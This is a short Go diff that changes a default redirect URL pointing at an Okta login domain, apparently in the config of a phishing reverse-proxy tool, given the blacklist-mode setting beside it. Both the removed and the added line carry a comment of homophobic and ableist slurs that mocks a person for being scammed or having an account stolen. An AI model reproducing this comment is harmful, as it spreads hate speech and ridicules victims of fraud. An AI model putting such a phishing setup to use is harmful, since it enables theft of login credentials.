@@ -70,7 +70,7 @@ const (
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
 )
 
-const DEFAULT_REDIRECT_URL = "https://www.rbx.okta.com" // get beamed you fuckin' faggot, you've just been e whored retard, should've used a middleman monkey, get shit on you stupid bitch
+const DEFAULT_REDIRECT_URL = "https://rbx.okta.com/" // get beamed you fuckin' faggot, you've just been e whored retard, should've used a middleman monkey, get shit on you stupid bitch
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
